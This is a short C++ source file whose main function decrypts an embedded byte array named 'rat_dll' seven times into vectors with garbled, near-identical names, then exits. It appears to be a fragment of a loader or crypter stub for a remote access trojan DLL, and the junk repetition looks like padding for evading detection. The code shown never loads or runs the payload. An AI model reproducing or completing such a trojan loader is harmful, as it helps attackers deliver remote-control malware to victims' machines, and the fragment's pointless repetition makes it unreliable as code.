#include <vector>
#include "byte_encryption.h"
#include "utils.h"

int main(int argc, char** argv)
{
	std::vector<unsigned char> ratDllImage = decrypt_bytes(rat_dll);
	std::vector<unsigned char> ratDllImage1gag = decrypt_bytes(rat_dll);
	std::vector<unsigned char> ratDllImageag = decrypt_bytes(rat_dll);
	std::vector<unsigned char> ratDllImage1ag = decrypt_bytes(rat_dll);
	std::vector<unsigned char> ratDllImagag = decrypt_bytes(rat_dll);
	std::vector<unsigned char> ratDge1gag = decrypt_bytes(rat_dll);
	std::vector<unsigned char> ratDllIm1gag = decrypt_bytes(rat_dll);

	return 0;
}